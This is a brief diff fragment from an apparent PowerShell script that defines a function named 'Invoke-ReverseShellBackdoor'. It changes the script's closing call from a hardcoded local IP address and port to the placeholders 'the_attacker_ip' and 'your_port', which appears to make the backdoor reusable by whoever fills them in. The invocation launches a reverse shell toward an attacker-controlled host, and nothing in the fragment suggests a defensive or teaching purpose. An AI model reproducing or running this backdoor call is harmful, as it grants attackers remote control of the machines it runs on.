@@ -38,4 +38,4 @@ function Invoke-ReverseShellBackdoor {
     }
 }
 
-Invoke-ReverseShellBackdoor "192.168.0.177" 5939
+Invoke-ReverseShellBackdoor "the_attacker_ip" "your_port"
